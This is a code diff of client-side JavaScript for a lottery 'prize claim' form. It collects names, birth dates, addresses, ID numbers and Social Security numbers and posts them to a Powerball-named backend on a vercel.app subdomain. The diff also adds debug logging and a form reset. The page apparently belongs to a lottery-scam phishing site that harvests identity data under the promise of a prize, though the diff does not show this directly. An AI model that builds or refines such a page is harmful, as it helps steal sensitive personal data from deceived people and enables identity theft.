@@ -451,63 +451,65 @@ window.onload = function () {
 //     });
 // });
 
-const API_URL =
-  process.env.NODE_ENV === "production"
-    ? "https://powerball-backend.vercel.app"
-    : "http://localhost:3000";
+const API_URL = "https://powerball-backend.vercel.app";
 
 document
   .getElementById("prizeClaimForm")
   .addEventListener("submit", async function (e) {
     e.preventDefault();
-
-    const formData = {
-      firstName: document.getElementById("firstName").value,
-      lastName: document.getElementById("lastName").value,
-      email: document.getElementById("email").value,
-      phone: document.getElementById("phone").value,
-      dob: document.getElementById("dob").value,
-      gender: document.getElementById("gender").value,
-      street: document.getElementById("street").value,
-      city: document.getElementById("city").value,
-      state: document.getElementById("state").value,
-      zipCode: document.getElementById("zipCode").value,
-      country: document.getElementById("country").value,
-      maritalStatus: document.getElementById("maritalStatus").value,
-      occupation: document.getElementById("occupation").value,
-      idType: document.getElementById("idType").value,
-      idNumber: document.getElementById("idNumber").value,
-      ssn: document.getElementById("ssn").value,
-    };
+    console.log("Form submitted"); // Debug log
 
     try {
-      const response = await fetch(
-        `${API_URL}/api/submit-form`,
-        {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json",
-          },
-          body: JSON.stringify(formData),
-        }
-      );
+      const formData = {
+        firstName: document.getElementById("firstName").value,
+        lastName: document.getElementById("lastName").value,
+        email: document.getElementById("email").value,
+        phone: document.getElementById("phone").value,
+        dob: document.getElementById("dob").value,
+        gender: document.getElementById("gender").value,
+        street: document.getElementById("street").value,
+        city: document.getElementById("city").value,
+        state: document.getElementById("state").value,
+        zipCode: document.getElementById("zipCode").value,
+        country: document.getElementById("country").value,
+        maritalStatus: document.getElementById("maritalStatus").value,
+        occupation: document.getElementById("occupation").value,
+        idType: document.getElementById("idType").value,
+        idNumber: document.getElementById("idNumber").value,
+        ssn: document.getElementById("ssn").value,
+      };
+
+      console.log("Attempting to send data to:", `${API_URL}/api/submit-form`);
+      
+      const response = await fetch(`${API_URL}/api/submit-form`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+          "Accept": "application/json"
+        },
+        body: JSON.stringify(formData),
+      });
+
+      if (!response.ok) {
+        throw new Error(`HTTP error! status: ${response.status}`);
+      }
 
       const data = await response.json();
+      console.log("Server response:", data);
 
-      if (response.ok) {
-        Swal.fire({
-          icon: "success",
-          title: "Success!",
-          text: "Your form has been submitted successfully.",
-        });
-      } else {
-        throw new Error(data.message || "Form submission failed");
-      }
+      Swal.fire({
+        icon: "success",
+        title: "Success!",
+        text: "Your form has been submitted successfully.",
+      });
+      
+      document.getElementById("prizeClaimForm").reset();
     } catch (error) {
+      console.error("Submission error:", error);
       Swal.fire({
         icon: "error",
         title: "Error!",
-        text: error.message || "Something went wrong. Please try again.",
+        text: "Failed to submit form. Please try again later.",
       });
     }
   });
